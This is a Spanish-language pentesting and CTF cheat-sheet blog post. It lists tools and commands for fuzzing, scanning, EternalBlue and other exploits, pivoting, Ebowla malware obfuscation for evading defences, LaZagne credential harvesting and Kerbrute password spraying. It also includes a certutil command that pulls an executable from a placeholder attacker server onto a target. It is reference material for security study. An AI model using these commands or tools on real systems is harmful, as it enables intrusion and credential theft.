---
date: "2025-08-13 02:43:19"
author: "Josfull"
title: "Herramientas y Técnicas para Pentesting y CTFs"
description: "Colección completa de herramientas, técnicas y comandos utilizados en pentesting, CTFs y evaluaciones de seguridad, organizados por categorías para referencia rápida."
showBreadcrumbs: true
showTableOfContents: false
---
# Herramientas y Técnicas para Pentesting y CTFs

Este documento recopila diversas herramientas, técnicas y comandos utilizados en pentesting, CTFs y evaluaciones de seguridad. Está organizado por categorías para facilitar su consulta rápida.

## Índice
- [Entornos Virtuales Python](#entornos-virtuales-python)
- [Manipulación de Resultados de Fuzzing](#manipulación-de-resultados-de-fuzzing)
- [Enumeración y Escaneo](#enumeración-y-escaneo)
- [Explotación de Vulnerabilidades](#explotación-de-vulnerabilidades)
- [Pivoting y Movimiento Lateral](#pivoting-y-movimiento-lateral)
- [Evasión de Defensas](#evasión-de-defensas)
- [Ataques de Autenticación](#ataques-de-autenticación)
- [Herramientas de Búsqueda de Vulnerabilidades](#herramientas-de-búsqueda-de-vulnerabilidades)
- [Transferencia de Archivos](#transferencia-de-archivos)
- [Sincronización de Tiempo](#sincronización-de-tiempo)
- [Miscelánea](#miscelánea)

## Entornos Virtuales Python

### 🧪 ¿Qué es un entorno virtual?

Es una carpeta aislada donde podés instalar paquetes de Python sin afectar el resto del sistema. Esto evita conflictos entre dependencias y permite tener múltiples proyectos con diferentes requisitos en la misma máquina.

### ✅ Cómo crear y usar un entorno virtual (Linux/macOS/WSL):

>nota personal: crea primero un directorio con el nombre de la herramienta

1. **Creá el entorno (por ejemplo, llamado `env`):**

```bash
virtualenv env
```

2. **Activalo:**

```bash
source env/bin/activate
```

Verás que el prompt cambia, por ejemplo:

```bash
(env) tu-usuario@maquina:~/proyecto$
```

3. **Ahora podés instalar `urldedupe` u otros paquetes sin afectar tu sistema:**

```bash
git clone https://github.com/ameenmaali/urldedupe.git
cd urldedupe
pip install .
```

4. **Cuando termines, desactivás el entorno:**

```bash
deactivate
```

### Migración entre versiones de Python

Para transformar un script de Python 2 a Python 3:

```bash
# Verificar versión de Python 3
python3 --version

# Realizar la conversión (vista previa)
python3 -m lib2to3 script.py

# Realizar la conversión permanente (modifica el archivo)
python3 -m lib2to3 -w -n script.py

# Ejecutar el script convertido
python3 script.py
```

## Manipulación de Resultados de Fuzzing

### Filtrar códigos de estado HTTP

```bash
# Extraer solo respuestas con código 200 y ordenarlas
grep 'Status: 200' resultados_ffuf.txt | awk '{print $1}' | sort -u > hits_200.txt

# Extraer redirecciones (302) en un archivo separado
grep 'Status: 302' resultados_ffuf.txt | awk '{print $1}' | sort -u > hits_302.txt
```

### Agregar dominio base a endpoints descubiertos

```bash
# Definir la URL base como variable de entorno
export TARGET=https://subdominio.com/

# Concatenar con cada endpoint encontrado
awk '{print ENVIRON["TARGET"] $1}' endpoints.txt > full_200.txt
```

## Enumeración y Escaneo

### Categorías de scripts de Nmap

Las categorías principales incluyen:
- **auth**: Scripts relacionados con autenticación
- **broadcast**: Para descubrimiento de hosts usando broadcast
- **brute**: Scripts para fuerza bruta
- **default**: Scripts ejecutados con la opción -sC
- **discovery**: Para descubrir servicios
- **dos**: Pruebas de denegación de servicio (¡cuidado!)
- **exploit**: Scripts que explotan vulnerabilidades
- **external**: Scripts que utilizan servicios externos
- **fuzzer**: Para fuzzear parámetros
- **intrusive**: Scripts que pueden ser detectados por defensas
- **malware**: Para detectar malware
- **safe**: Scripts considerados seguros, no intrusivos
- **vuln**: Para detectar vulnerabilidades específicas

### Escaneo de cabeceras HTTP de seguridad

```bash
# Uso de SSLyze para analizar cabeceras HTTP de seguridad
sslyze --http_headers <dominio> > sslyze_hsts_scan
```

## Explotación de Vulnerabilidades

### EternalBlue (MS17-010)

Repositorio con exploits y herramientas para MS17-010:
[https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)

Este repositorio incluye:
- Scanner para detectar sistemas vulnerables
- Exploits para diferentes versiones de Windows
- Scripts auxiliares para la explotación

### Windows Exploit Suggester

**Windows Exploit Suggester Original**
[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

1. Descargar la base de datos más reciente:
```bash
python windows-exploit-suggester.py --update
```

2. Analizar la salida de `systeminfo` para encontrar vulnerabilidades:
```bash
python windows-exploit-suggester.py --database <archivo-db> --systeminfo systeminfo.txt
```



**WESng (Windows Exploit Suggester - Next Generation)**
[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

Una versión mejorada que incluye:
- Base de datos actualizada
- Mejor rendimiento
- Menos falsos positivos

### Exploits binarios de Offensive Security

Colección de exploits binarios compilados y listos para usar:
[https://gitlab.com/exploit-database/exploitdb-bin-sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)

## Pivoting y Movimiento Lateral

### Ligolo-ng - Herramienta de pivoting automático

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Tutorial detallado: [Explicación de Xerosec](https://youtu.be/Kimrp9WZPTU?si=BbCk2DccaJODKeuB)

Ligolo-ng es una herramienta moderna de pivoting que permite:
- Reenvío de puertos transparente
- Pivoting a través de múltiples hosts
- Tunneling para protocolos TCP/UDP
- Interfaz de usuario intuitiva

## Evasión de Defensas

### Ebowla - Framework para ofuscación de malware

[https://github.com/Genetic-Malware/Ebowla](https://github.com/Genetic-Malware/Ebowla)

Ebowla permite:
- Ofuscar ejecutables y scripts de PowerShell/Python
- Usar técnicas de cifrado basadas en entorno
- Evadir mecanismos de defensa como Windows Defender
- Generar carga útil polimórfica

## Ataques de Autenticación

### LaZagne - Herramienta de recuperación de credenciales

[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)

LaZagne es una herramienta de código abierto que permite:
- Recuperar contraseñas almacenadas en un sistema local
- Extraer credenciales de navegadores, clientes de correo, etc.
- Obtener contraseñas de aplicaciones comunes (FileZilla, WiFi, etc.)
- Funciona en Windows, Linux y macOS

### Kerbrute - Herramienta para ataques Kerberos

[https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

Kerbrute es una herramienta rápida para:
- Enumerar usuarios en un dominio Active Directory
- Realizar ataques de password spraying
- Búsqueda de cuentas ASREPRoastables
- Realizar ataques de fuerza bruta contra cuentas

```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
# Compilar o descargar binarios precompilados
```

## Herramientas de Búsqueda de Vulnerabilidades

### Vulners - Base de datos de exploits

[https://vulners.com/githubexploit/1321A903-80B8-56C5-A776-516C0F848CB8](https://vulners.com/githubexploit/1321A903-80B8-56C5-A776-516C0F848CB8)

Vulners es un motor de búsqueda de vulnerabilidades que permite:
- Encontrar exploits para servicios específicos
- Correlacionar CVEs con exploits disponibles
- Acceder a una extensa base de datos de vulnerabilidades

### XSS0r - Herramienta para descubrir XSS

[https://xss0r.com/](https://xss0r.com/)

XSS0r permite:
- Detectar vulnerabilidades XSS en aplicaciones web
- Generar payloads personalizados
- Automatizar la búsqueda de puntos de inyección

## Transferencia de Archivos

### Descarga de archivos en Windows con certutil.exe

![Certutil para descargas](Pasted%20image%2020250811232036.png)

```bash
# En el sistema Windows objetivo
certutil.exe -urlcache -f http://servidor-atacante/archivo.exe archivo.exe
```

Certutil es una herramienta nativa de Windows que puede usarse para:
- Descargar archivos desde un servidor remoto
- Codificar/decodificar archivos en base64
- Evitar restricciones en la ejecución de PowerShell
- Funciona incluso en sistemas endurecidos

## Sincronización de Tiempo

### Sincronizar reloj para ataques Kerberos

```bash
# Sincronizar el reloj con un controlador de dominio
ntpdate <ip-del-controlador-dominio>
```

La sincronización precisa del tiempo es crucial para:
- Ataques de Kerberoasting
- Explotación de Golden/Silver Tickets
- Prevenir errores en autenticación Kerberos (tolerancia ±5 minutos)
- Evitar problemas con tickets de autenticación


**Nota**: Este documento se actualiza regularmente con nuevas herramientas y técnicas. Última actualización: 2025-08-13.

---

> *Josfull — Creador, escritor y pentester detrás de cada línea de este sitio.*